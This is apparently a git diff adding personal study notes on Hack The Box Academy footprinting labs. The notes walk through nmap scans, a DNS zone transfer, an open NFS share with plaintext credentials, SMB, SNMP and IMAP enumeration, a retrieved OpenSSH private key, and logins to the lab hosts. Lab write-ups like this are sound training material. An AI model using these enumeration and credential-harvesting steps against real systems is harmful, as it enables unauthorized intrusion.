@@ -1034,15 +1034,610 @@ In addition to the pure exchange of information, SNMP also transmits control com
 
 
 
+## 2.8 sql
+
+```shell
+sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
+```
+
+```shell
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+```
 
 
 
+# 3 Lab
+
+## 3.1 Lab - 1 DNS server
+
+First, use nmap:
+
+```shell
+┌─[us-academy-6]─[10.10.15.136]─[htb-ac-1968048@htb-0krf83hxdj]─[~/Desktop]
+└──╼ [★]$ sudo nmap -sC -sV -Pn -p- --min-rate 2000 10.129.228.80
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-01 18:28 CDT
+Nmap scan report for 10.129.228.80
+Host is up (0.021s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     ProFTPD
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+2121/tcp open  ftp     ProFTPD
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.02 seconds
+```
+
+enumerate DNS:
+
+```shell
+┌─[us-academy-6]─[10.10.15.136]─[htb-ac-1968048@htb-0krf83hxdj]─[~/Desktop]
+└──╼ [★]$ dig @10.129.228.80 AXFR inlanefreight.htb
+
+; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.228.80 AXFR inlanefreight.htb
+; (1 server found)
+;; global options: +cmd
+inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
+inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
+inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
+inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
+app.inlanefreight.htb.	604800	IN	A	10.129.18.15
+internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
+mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
+ns.inlanefreight.htb.	604800	IN	A	10.129.34.136
+inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+;; Query time: 23 msec
+;; SERVER: 10.129.228.80#53(10.129.228.80) (TCP)
+;; WHEN: Mon Sep 01 18:34:07 CDT 2025
+;; XFR size: 10 records (messages 1, bytes 540)
+
+```
+
+Try SSH with the given creds:
+
+failed
+
+so try ftp:
+
+21 is a empty folder, we should try 2121:
+
+<img src="assets/image-20250901193931460.png" alt="image-20250901193931460" style="width:50%;" />
+
+and use id_rsa to log in:
+
+```shell
+┌─[us-academy-6]─[10.10.15.136]─[htb-ac-1968048@htb-0krf83hxdj]─[~/Desktop]
+└──╼ [★]$ chmod 600 id_rsa
+┌─[us-academy-6]─[10.10.15.136]─[htb-ac-1968048@htb-0krf83hxdj]─[~/Desktop]
+└──╼ [★]$ ssh -i id_rsa ceil@10.129.228.80
+
+```
+
+and then we can find flag.txt in flag folder.
 
 
 
+## 3.2 Lab - 2 
+
+This second server is a server that everyone on the internal network has access to. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.
+
+Target: Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.
+
+First, use nmap:
+
+```shell
+└──╼ [★]$ sudo nmap -sC -sV -Pn -p- --min-rate 2000 10.129.202.41
+PORT      STATE SERVICE       VERSION
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-09-01T23:44:51+00:00
+|_ssl-date: 2025-09-01T23:44:59+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WINMEDIUM
+| Not valid before: 2025-08-31T22:42:45
+|_Not valid after:  2026-03-02T22:42:45
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-09-01T23:44:52
+|_  start_date: N/A
+```
+
+**111/tcp + 2049/tcp → NFS (Network File System)**
+
+**135/139/445/tcp → Windows SMB**
+
+**3389/tcp → RDP (Remote Desktop)**
+
+**5985/tcp → WinRM (Windows Remote Management)**
+
+**47001/tcp → WinRM additional service port**
+
+Hostname shows up as **WINMEDIUM**
+
+first check Check NFS exports:
+
+```shell
+└──╼ [★]$ showmount -e 10.129.202.41
+Export list for 10.129.202.41:
+/TechSupport (everyone)
+└──╼ [★]$ sudo mount -t nfs 10.129.202.41:/TechSupport /mnt
+└──╼ [★]$ sudo ls -la /mnt
+──╼ [★]$ sudo cat /mnt/ticket4238791283782.txt
+Conversation with InlaneFreight Ltd
+
+Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
+---
+01:27 PM | Operator: Hello,. 
+ 
+So what brings you here today?
+01:27 PM | alex: hello
+01:27 PM | Operator: Hey alex!
+01:27 PM | Operator: What do you need help with?
+01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
+01:38 PM | Operator: Of course
+01:42 PM | alex: here it is:
+
+ 1smtp {
+ 2    host=smtp.web.dev.inlanefreight.htb
+ 3    #port=25
+ 4    ssl=true
+ 5    user="alex"
+ 6    password="lol123!mD"
+ 7    from="alex.g@web.dev.inlanefreight.htb"
+ 8}
+ 9
+10securesocial {
+11    
+12    onLoginGoTo=/
+13    onLogoutGoTo=/login
+14    ssl=false
+15    
+16    userpass {      
+17    	withUserNameSupport=false
+18    	sendWelcomeEmail=true
+19    	enableGravatarSupport=true
+20    	signupSkipLogin=true
+21    	tokenDuration=60
+22    	tokenDeleteInterval=5
+23    	minimumPasswordLength=8
+24    	enableTokenJob=true
+25    	hasher=bcrypt
+26	}
+27
+28     cookie {
+29     #       name=id
+30     #       path=/login
+31     #       domain="10.129.2.59:9500"
+32            httpOnly=true
+33            makeTransient=false
+34            absoluteTimeoutInMinutes=1440
+35            idleTimeoutInMinutes=1440
+36    }   
+
+```
+
+Validate `alex` on the Windows host:
+
+```shell
+crackmapexec smb 10.129.202.41 -u alex -p 'lol123!mD'
+SMB         10.129.202.41   445    WINMEDIUM        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINMEDIUM) (domain:WINMEDIUM) (signing:False) (SMBv1:False)
+SMB         10.129.202.41   445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD 
+```
+
+Enumerate SMB shares:
+
+```shell
+└──╼ [★]$ smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
+[+] IP: 10.129.202.41:445	Name: 10.129.202.41                                     
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	devshare                                          	READ, WRITE	
+	IPC$                                              	READ ONLY	Remote IPC
+	Users                                             	READ ONLY
+```
+
+when we enter user, we only found alex folder
+
+<img src="assets/image-20250901200427553.png" alt="image-20250901200427553" style="width:50%;" />
+
+enter dev share:
+
+<img src="assets/image-20250901200522962.png" alt="image-20250901200522962" style="width:50%;" />
+
+the txt is: sa:87N1ns@slls83
+
+And I suddenly found the hint is In SQL Management Studio, we can edit the last 200 entries of the selected database and read the entries accordingly. We also need to keep in mind, that each Windows system has an Administrator account.
+
+so maybe the crendential is sql?
+
+then we test this, the first one success, we get admin's password
+
+![image-20250901200820592](assets/image-20250901200820592.png)
+
+we can log to win-rm:
+
+![image-20250901200946689](assets/image-20250901200946689.png)
+
+![image-20250901201532658](assets/image-20250901201532658.png)
+
+![image-20250901201558112](assets/image-20250901201558112.png)
+
+Got target:
+
+![image-20250901201631987](assets/image-20250901201631987.png)
 
 
 
+## 3.2 Lab - 3
+
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
+
+target: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+
+nmap:
+
+```shell
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+110/tcp open  pop3     Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_pop3-capabilities: AUTH-RESP-CODE UIDL STLS USER TOP SASL(PLAIN) RESP-CODES CAPA PIPELINING
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: IDLE LOGIN-REFERRALS have SASL-IR more listed OK capabilities Pre-login ENABLE ID post-login AUTH=PLAINA0001 LITERAL+ IMAP4rev1 STARTTLS
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: IDLE LOGIN-REFERRALS SASL-IR more listed have Pre-login capabilities ENABLE ID post-login AUTH=PLAINA0001 LITERAL+ IMAP4rev1 OK
+995/tcp open  ssl/pop3 Dovecot pop3d
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: PIPELINING AUTH-RESP-CODE USER UIDL SASL(PLAIN) TOP CAPA RESP-CODES
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+**SSH (22)**
+
+**Dovecot POP3/IMAP (110, 143, 993, 995)** → mail services
+
+nmap again:
+
+```shell
+we found snmp
+```
+
+![image-20250901203207220](assets/image-20250901203207220.png)
+
+then `snmpwalk -v2c -c backup 10.129.214.105`:
+
+```shell
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (96231) 0:16:02.31
+iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
+iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
+iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (7) 0:00:00.07
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (96962) 0:16:09.62
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 09 02 00 21 29 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 145
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
+iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
+iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
+iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
+iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
+Authentication token manipulation error
+chpasswd: (line 1, user tom) password not changed
+Changing password for tom."
+iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
+
+```
+
+we found tom NMds732Js2761
+
+ssh need key, so we use openssl s_client -connect 10.129.214.105:993, 
+
+a1 LOGIN tom NMds732Js2761
+
+![image-20250901203639808](assets/image-20250901203639808.png)
+
+<img src="assets/image-20250901203701351.png" alt="image-20250901203701351" style="width:50%;" />
+
+and we found key:
+
+```shell
+a3 SELECT INBOX
+a3 OK [READ-WRITE] Select completed (0.017 + 0.000 + 0.017 secs).
+a4 FETCH 1:* BODY[]
+* 1 FETCH (BODY[] {3661}
+HELO dev.inlanefreight.htb
+MAIL FROM:<tech@dev.inlanefreight.htb>
+RCPT TO:<bob@inlanefreight.htb>
+DATA
+From: [Admin] <tech@inlanefreight.htb>
+To: <tom@inlanefreight.htb>
+Date: Wed, 10 Nov 2010 14:21:26 +0200
+Subject: KEY
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+)
+a4 OK Fetch completed (0.005 + 0.000 + 0.004 secs).
 
 
+```
+
+ssh -i id_rsa tom@10.129.214.105
+
+```shell
+tom@NIXHARD:~/Maildir$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
